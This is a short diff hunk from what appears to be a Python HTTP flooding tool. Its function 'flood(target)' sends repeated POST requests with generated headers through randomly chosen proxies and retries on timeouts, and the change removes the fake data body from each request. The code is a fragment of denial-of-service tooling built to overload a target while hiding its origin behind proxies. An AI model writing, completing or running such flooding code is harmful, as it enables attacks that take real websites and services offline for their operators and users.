@@ -153,7 +153,7 @@ def flood(target: str) -> None:
         headers = generate_headers()
         try:
             proxy = random.choice(proxies)
-            response = requests.post(target, data=fakedata, headers=headers, proxies=proxy, timeout=5)
+            response = requests.post(target,headers=headers, proxies=proxy, timeout=5)
         except (Timeout, OSError):
             continue
         else:
